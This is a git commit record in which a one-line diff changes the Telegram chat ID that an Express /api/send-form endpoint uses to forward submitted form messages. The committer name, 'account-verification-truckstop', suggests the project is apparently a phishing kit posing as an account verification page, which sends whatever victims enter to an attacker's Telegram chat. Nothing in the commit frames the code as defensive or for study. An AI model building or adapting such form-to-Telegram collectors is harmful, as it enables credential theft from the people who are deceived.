71f20b9a4863c3725f8655d9f7c09ca2974f06f9
account-verification-truckstop <tasicjessica8@gmail.com>
2025-05-25 16:45:17 +0400

    fixed

--- index.js
+++ index.js
@@ -106,7 +106,7 @@ app.post("/api/send-form", async (req, res) => {
 
   try {
     await axios.post(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002515394252`,
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002333967345`,
       {
         chat_id: CHAT_ID,
         text: message,
